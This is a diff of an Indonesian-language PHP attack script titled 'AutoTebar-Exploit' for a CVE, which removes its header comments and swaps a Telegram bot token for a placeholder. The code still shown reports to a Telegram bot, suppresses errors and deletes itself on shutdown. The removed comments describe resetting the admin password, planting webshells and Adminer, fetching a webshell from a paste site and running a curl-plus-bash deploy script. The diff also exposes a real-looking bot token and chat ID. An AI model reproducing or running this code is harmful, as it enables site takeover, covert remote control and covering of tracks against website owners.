@@ -1,14 +1,4 @@
     <?php
-    /**
-     * AutoTebar-Exploit - CVE-2026-48907 (Fixed)
-     * 
-     * - Admin random password
-     * - Lock folder: images/pixabay (PHP → 404)
-     * - WebShell & Adminer di folder aman
-     * - Tambahan webshell dari paste.mangsud.org
-     * - Auto-execute curl + bash deploy-all.sh
-     * - Self-delete setelah eksekusi
-     */
 
     error_reporting(0);
     ini_set('display_errors', 0);
@@ -16,25 +6,20 @@
     ignore_user_abort(true);
     @ob_start();
 
-    // =========================================================================
-    // SELF-DELETE: hapus file ini setelah eksekusi selesai
-    // =========================================================================
+
     register_shutdown_function(function() {
         @ob_end_flush();
         @unlink(__FILE__);
     });
 
-    $BOT_TOKEN = "8941711519:AAGd5UBHOeTXwcH-rNreqoEHicpq3U1uzKQ";
+    $BOT_TOKEN = "biji";
     $CHAT_ID   = "8600700974";
 
-    /**
-     * Kirim pesan ke Telegram (dengan fallback cURL)
-     */
+
     function send_tg($msg) {
         global $BOT_TOKEN, $CHAT_ID;
         $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?chat_id={$CHAT_ID}&text=" . urlencode($msg);
         
-        // Coba file_get_contents dulu
         $result = @file_get_contents($url);
         if ($result === false) {
             // Fallback dengan cURL
@@ -62,7 +47,6 @@
         return $password;
     }
 
-    // Flush output awal agar progres terlihat
     echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
     echo "╔══════════════════════════════════════════════════════════════════╗\n";
     echo "║   🔥 AutoTebar-Exploit - CVE-2026-48907 (Fixed) 🔥             ║\n";
@@ -70,9 +54,7 @@
     echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
     @ob_flush(); flush();
 
-    // =========================================================================
-    // BASE PATH: ../../ dari direktori skrip ini
-    // =========================================================================
+
     $base = realpath(__DIR__ . '/../..');
     if ($base === false) {
         die("[-] Gagal mendapatkan base path!\n");
